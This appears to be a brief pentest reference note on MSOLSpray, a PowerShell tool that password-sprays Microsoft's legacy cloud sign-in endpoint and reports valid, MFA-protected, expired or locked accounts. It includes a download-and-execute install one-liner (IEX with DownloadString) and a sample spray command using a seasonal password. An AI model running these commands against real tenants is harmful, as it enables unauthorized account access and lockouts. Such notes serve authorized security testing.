# MSOLSpray

**Tags:** `#msolspray` `#entraid` `#azuread` `#passwordspray` `#cloud` `#powershell`

PowerShell password spraying tool (dafthack) targeting the legacy Microsoft Online (MSOL) sign-in endpoint. Beyond a plain valid/invalid result, it distinguishes several outcomes per attempt — valid credentials, valid credentials requiring MFA, expired password, locked/disabled account — which makes it useful for confirming account existence and MFA posture during a spray, not just finding hits.

**Source:** https://github.com/dafthack/MSOLSpray
**Install:**
```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dafthack/MSOLSpray/master/MSOLSpray.ps1')
# or: git clone https://github.com/dafthack/MSOLSpray ; Import-Module .\MSOLSpray.ps1
```

```powershell
Import-Module MSOLSpray
Invoke-MSOLSpray -UserList users.txt -Password "Spring2024!"
```

> [!note] **See also** — [[Services/Active Directory/Entra ID|Entra ID]] Password Spraying section.

---

*Created: 2026-07-27*
*Updated: 2026-07-27*
*Model: claude-sonnet-5*
